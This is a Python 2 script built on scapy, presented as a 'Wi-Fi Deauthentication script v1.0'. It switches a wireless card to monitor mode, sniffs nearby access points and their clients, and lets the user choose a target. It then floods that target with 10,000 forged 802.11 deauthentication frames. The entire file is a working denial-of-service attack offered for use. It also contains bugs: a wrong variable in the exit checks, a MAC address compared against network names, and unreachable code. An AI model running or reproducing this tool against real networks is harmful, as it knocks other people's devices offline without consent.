import os

from scapy.all import *



devices = {}

clients = {}



def Welcome():

	print("Welcome to Wi-Fi Deauthentication script v1.0")

	print("Developed by Sagi Saada and Shlomi Domennko")



def MonitorMode(interface):

	os.system("bash monitor.sh "+interface)

	print(interface+" mode changed to Monitor\n")



def DeauthAttack(interface, device_target, client_target):

	pkt = RadioTap() / Dot11( addr1 = client_target, addr2 = device_target, addr3 = device_target) / Dot11Deauth()

	sendp(pkt, iface = interface, count = 10000, inter = .2)



def Display_Devices_Clients():

	os.system("clear")

	print devices

	print clients

	print ("-------- Devices Table --------\n")

	print ("---- ESSID -------- MAC Address ----\n")

	for device in devices:

		print (devices[device] +" \t " + device)

	print ("-----------------------------------\n")



	print ("-------- Clients Table --------\n")

	print ("---- BSSID -------- Mac Address ----\n")

	for client in clients:

		print (clients[client] +" \t "+ client)

	print ("-----------------------------------\n")

	print ("Press [Ctrl+C] to stop.")



def Display_Devices():

	count = 1

	print("\n")

	for device in devices:

		print (""+str(count)+". "+device +"\t"+devices[device])

		count += 1



def Display_Clients():

	count = 1

	print("\n")

	for client in clients:

		print (""+str(count)+". "+client +"\t"+clients[client])

		count += 1



def PacketHandler(pkt):

	try:

		flag = 0

		# Find all beacon packets - this means - wifi AP.

		if(pkt.haslayer(Dot11Elt) and pkt.type == 0 and pkt.subtype == 8):

			if(pkt.addr2 not in devices.keys()):

				devices[pkt.addr2] = pkt.info

				flag = 1

# and not pkt.haslayer(EAPOL)

		if(pkt.haslayer(Dot11) and pkt.getlayer(Dot11).type == 2L):

			#This is data frame packet.

			dest = pkt.addr2

        		src = pkt.addr1

			if(dest in devices.keys()):

				if(src not in clients.keys()):

					clients[src] = devices[dest]

					flag = 1

		if(flag):

			Display_Devices_Clients()

	except KeyboardInterrupt:

		print ("\nInterruption detected.\n")



def Device_Interface():

	choise  = raw_input("\nSelect an interface to work with (leave blank for wlan0):")

	if(choise == ""):

		return "wlan0"

	else:

		return choise

	print("\nYour interface device is "+interface+"\n")



def Exit():

	print("Exiting Wi-Fi Deauthentication script v1.0 - See you soon!")

	sys.exit(0)

		

def Interface():

	try:

		Welcome()

		interface = Device_Interface()



		choise = raw_input("Put "+interface+" in monitor mode? Y/n (leave blank for Y):")



		if(choise == "y" or choise == "Y" or choise == ""):

			MonitorMode(interface)



		choise = raw_input("Start to scan? Y/n (leave blank for Y):")

		if(choise == "y" or choise == "Y" or choise == ""):

			print("Starting check for Devices and Clients\n")

			sniff(iface = interface, prn = PacketHandler)

		#flag = 1

		if(devices and clients):

			Display_Devices()

			while(1):

				device_target = raw_input("\nPlease choose Device MAC Address (For example: 00:18:25:16:72:b0):")	

				if(device_target == "exit" or choise == "quit"):

					Exit()

				if(device_target not in devices.values()):

					print("Bad Device MAC Address")

				else:

					break

					#client_target = raw_input("\nPlease choose Client MAC Address (For example: 00:18:25:16:72:b0):")

					#DeauthAttack(interface, choise)

					#flag = 0

			Display_Clients()

			while(1):

				client_target = raw_input("\nPlease choose Client MAC Address (For example: 00:18:25:16:72:b0):")

				if(client_target == "exit" or choise == "quit"):

					Exit()

				#if(client_target not in clients.values()):

				#	print("Bad Device MAC Address")

				else:

					DeauthAttack(interface, device_target, client_target)

					break



		else:

			print("Devices \ Clients Tables is null\n")

		Exit()



	except KeyboardInterrupt:

		print ("\nInterruption detected.\n")

		exit()



if __name__ == '__main__':

	Interface()
